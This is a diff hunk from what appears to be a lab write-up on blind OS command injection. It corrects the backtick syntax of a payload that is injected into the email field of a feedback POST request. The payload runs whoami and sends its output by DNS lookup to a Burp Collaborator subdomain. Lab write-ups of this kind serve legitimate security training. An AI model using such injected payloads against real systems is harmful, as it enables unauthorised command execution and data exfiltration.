@@ -8,7 +8,7 @@ To solve the lab, execute the whoami command and exfiltrate the output via a DNS
 
 captured the feedback POST request and modified the email with the payload 
 
-||nslookup+``whoami``.BURP-COLLABORATOR-SUBDOMAIN||
+||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
 
 then inserted the burp collaborator payload for the subdomain
 
